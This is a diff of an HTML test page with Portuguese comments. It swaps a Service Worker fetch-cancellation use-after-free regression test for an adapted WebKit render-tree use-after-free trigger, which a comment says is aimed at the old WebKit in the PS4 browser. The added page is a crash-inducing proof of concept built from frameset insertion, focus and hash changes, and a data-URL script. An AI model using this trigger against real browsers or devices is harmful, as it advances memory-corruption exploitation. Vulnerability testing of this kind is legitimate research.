@@ -1,91 +1,52 @@
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Teste de Regressão: Cancelamento de Stream no Fetch do Service Worker</title>
-</head>
-<body>
-<div id="status">Executando teste...</div>
-
+<!--
+  Adaptação do teste render-tree-as-text-uaf.html para browser sem internals API
+  AVISO: Sem internals.settings.setCaretBrowsingEnabled(true), o code path
+  exato do UAF pode não ser atingido. Um crash indica vulnerabilidade presente.
+  Ausência de crash NÃO garante que o fix foi aplicado — o trigger pode
+  simplesmente não ter funcionado.
+-->
+<style>
+  iframe {
+    content: url();
+    zoom: 0.01;
+  }
+</style>
+<div id="status">Executando...</div>
 <script>
-// Função utilitária de GC via alocação recursiva de memória
-function gc() {
-    function gcRec(n) {
-        if (n < 1)
-            return {};
-        var temp = { i: "ab" + i + (i / 100000) };
-        temp += "foo";
-        gcRec(n - 1);
-    }
-    for (var i = 0; i < 1000; i++)
-        gcRec(10);
-}
+  onload = () => {
+    // internals.settings.setAsyncFrameScrollingEnabled(true) — sem equivalente público
+    // internals.settings.setCaretBrowsingEnabled(true) — sem equivalente público
+    // Sem essas flags, o code path do UAF pode não ser alcançado.
 
-// Código do Service Worker que fornece streaming contínuo de chunks
-const swCode = `
-    self.addEventListener('fetch', (event) => {
-        const stream = new ReadableStream({
-            start(controller) {
-                controller.enqueue(new Uint8Array([1, 2, 3, 4]));
-            },
-            pull(controller) {
-                // Força geração periódica de chunks
-                controller.enqueue(new Uint8Array(1024));
-            },
-            cancel(reason) {
-                // Ponto de cancelamento
-            }
-        });
+    document.documentElement.append(document.createElement('frameset'));
 
-        event.respondWith(new Response(stream));
-    });
-`;
+    const i0 = document.getElementById('i0');
 
-async function runFetchCancelUAFTest() {
-    if (!navigator.serviceWorker) {
-        document.getElementById("status").innerText = "PASS: Service Worker não suportado.";
-        return;
+    i0.onfocus = () => {
+      location.hash = 'y';
+    };
+
+    location.hash = 'x';
+
+    const s0 = document.createElement('script');
+
+    // Cache API pode não existir em WebKit antigo do PS4
+    if (window.caches) {
+      s0.src = `data:text/javascript,caches.has('a').then(() => document.getElementById('i0').focus());`;
+    } else {
+      // Fallback: tenta acionar o foco de forma assíncrona via microtask/macrotask
+      s0.src = `data:text/javascript,Promise.resolve().then(() => document.getElementById('i0').focus());`;
     }
 
-    const swBlobUrl = URL.createObjectURL(new Blob([swCode], { type: "application/javascript" }));
-    const scope = "./sw-stream-cancel-" + Date.now() + "/";
+    document.head.append(s0);
 
-    try {
-        const reg = await navigator.serviceWorker.register(swBlobUrl, { scope: scope });
-        await navigator.serviceWorker.ready;
-
-        for (let cycle = 0; cycle < 50; cycle++) {
-            const controller = new AbortController();
-
-            // 1. Inicia a requisição capturada pelo Service Worker
-            const fetchPromise = fetch(`${scope}chunk-stream-${cycle}`, {
-                signal: controller.signal
-            });
-
-            // 2. Obtém a resposta e inicia a leitura do stream
-            const res = await fetchPromise.catch(() => {});
-            if (res && res.body) {
-                const reader = res.body.getReader();
-                await reader.read().catch(() => {});
-
-                // 3. Cancela a stream no cliente enquanto descarta o leitor e o objeto resposta
-                controller.abort();
-                reader.cancel().catch(() => {});
-            }
-
-            // 4. Força pressão no GC no tick de cancelamento
-            // Sem o RefPtr protectedResponse, o GC coletava o FetchResponse dentro de cancelStream()
-            gc();
-        }
-
-        await reg.unregister();
-        document.getElementById("status").innerText = "PASS: Cancelamento de stream de Fetch executado sem Use-After-Free.";
-    } catch (e) {
-        document.getElementById("status").innerText = "FAIL: " + e.message;
-    }
-}
-
-runFetchCancelUAFTest();
+    // Indicador de sobrevivência — só chega aqui se não houve crash
+    setTimeout(() => {
+      document.getElementById('status').textContent =
+        'Concluído sem crash detectado nesta janela. ' +
+        'Nota: ausência de crash pode indicar que o code path não foi atingido.';
+    }, 3000);
+  };
 </script>
-</body>
-</html>
+<iframe id="i0"></iframe>
